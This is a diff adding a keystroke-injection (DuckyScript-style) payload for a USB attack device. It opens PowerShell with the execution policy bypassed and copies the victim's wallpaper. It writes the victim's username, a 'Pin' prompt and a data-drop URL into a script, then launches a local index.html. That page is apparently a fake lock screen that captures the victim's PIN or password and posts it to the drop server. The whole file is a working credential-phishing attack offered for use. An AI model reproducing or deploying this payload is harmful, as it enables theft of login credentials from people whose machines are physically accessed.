@@ -1,0 +1,43 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoLogo -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 2000
+
+STRING $DROP_URL = "http:server:port/drop.php"
+ENTER
+STRING $INPUT_PLACEHOLDER = "Pin"
+ENTER
+
+
+STRING $BB_VOLUME =  (Get-WmiObject Win32_Volume | Where-Object {$_.Label -eq "BAD"}).DriveLetter
+ENTER
+STRING cd $BB_VOLUME
+ENTER
+
+
+STRING Copy-Item -Path $env:appdata\Microsoft\Windows\Themes\TranscodedWallpaper -Destination ./ww.jpg -Force
+ENTER
+DELAY 1000
+
+
+STRING "const CURRENT_USERNAME = '$($env:username)';" | Out-File -FilePath ./pw.js -Append
+ENTER
+DELAY 1000
+
+STRING "const INPUT_PLACEHOLDER = '${INPUT_PLACEHOLDER}';" | Out-File -FilePath ./pw.js -Append
+ENTER
+DELAY 1000
+
+STRING "const DROP_URL = '${DROP_URL}';" | Out-File -FilePath ./pw.js -Append
+ENTER
+DELAY 1000
+
+STRING (Invoke-Expression ./index.html); 
+ENTER
+DELAY 2000
+TAB
+DELAY 2000
+ENTER
+DELAY 2000
